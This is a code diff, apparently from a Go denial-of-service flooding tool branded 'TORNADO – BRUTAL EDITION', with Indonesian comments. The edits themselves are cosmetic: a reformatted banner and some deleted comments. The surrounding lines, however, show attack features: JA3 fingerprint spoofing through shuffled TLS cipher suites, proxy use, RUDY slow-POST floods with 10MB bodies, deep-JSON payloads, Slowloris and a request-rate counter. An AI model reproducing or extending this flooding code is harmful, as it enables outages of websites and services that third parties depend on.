@@ -28,20 +28,17 @@ import (
 	"golang.org/x/net/proxy"
 )
 
-// ==================== BANNER ====================
-const BANNER = `
-\033[91m╔══════════════════════════════════════════════════════════════════════════════╗
-\033[95m   ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ 
-\033[95m   ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗
-\033[95m      ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║
-\033[95m      ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║
-\033[95m      ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝
-\033[95m      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ 
-\033[93m                ⚡  TORNADO – BRUTAL EDITION  ⚡
-\033[93m          “Bukan angin, tapi badai yang menghancurkan.” 🌪️
-\033[91m╚══════════════════════════════════════════════════════════════════════════════╝
-\033[0m
-`
+// ==================== BANNER (DENGAN WARNA) ====================
+const BANNER = "\033[91m╔══════════════════════════════════════════════════════════════════════════════╗\n" +
+	"\033[95m   ████████╗ ██████╗ ██████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ \n" +
+	"\033[95m   ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔═══██╗\n" +
+	"\033[95m      ██║   ██║   ██║██████╔╝██╔██╗ ██║███████║██║  ██║██║   ██║\n" +
+	"\033[95m      ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══██║██║  ██║██║   ██║\n" +
+	"\033[95m      ██║   ╚██████╔╝██║  ██║██║ ╚████║██║  ██║██████╔╝╚██████╔╝\n" +
+	"\033[95m      ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ \n" +
+	"\033[93m                ⚡  TORNADO – BRUTAL EDITION  ⚡\n" +
+	"\033[93m          “Bukan angin, tapi badai yang menghancurkan.” 🌪️\n" +
+	"\033[91m╚══════════════════════════════════════════════════════════════════════════════╝\033[0m\n"
 
 // ==================== GLOBAL VARIABLES ====================
 var (
@@ -137,7 +134,7 @@ func getProxy() string {
 
 // ==================== JA3 SPOOF ====================
 func randomCipherSuites() []uint16 {
-	all := tls.CipherSuites() // []*tls.CipherSuite
+	all := tls.CipherSuites()
 	rand.Shuffle(len(all), func(i, j int) { all[i], all[j] = all[j], all[i] })
 	count := 10
 	if len(all) < count {
@@ -316,7 +313,6 @@ func httpWorker(methodList []string) {
 			var payload []byte
 			if method == "POST" || method == "PUT" || method == "PATCH" {
 				if enableRUDY && rand.Intn(3) == 0 {
-					// RUDY: slow POST (tapi tidak bisa menggunakan slow reader tanpa time.Sleep, kita pakai large body)
 					payload = bytes.Repeat([]byte("X"), 1024*1024*10) // 10MB
 				} else if enableDeepJSON {
 					data := deepJSON()
@@ -399,7 +395,7 @@ func statsPrinter() {
 			success := atomic.LoadUint64(&stats.success)
 			failed := atomic.LoadUint64(&stats.failed)
 			fmt.Printf("\r\033[93m[TORNADO] Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
-				total, success, failed, total/2) // rate per 0.5s dikali 2
+				total, success, failed, total/2)
 		}
 	}
 }
@@ -470,7 +466,6 @@ func main() {
 		enableDeepJSON = true
 		enableSlowloris = true
 		enableRUDY = true
-		// enableTor butuh Tor running, tidak diaktifkan otomatis
 	}
 
 	// Parsing methods
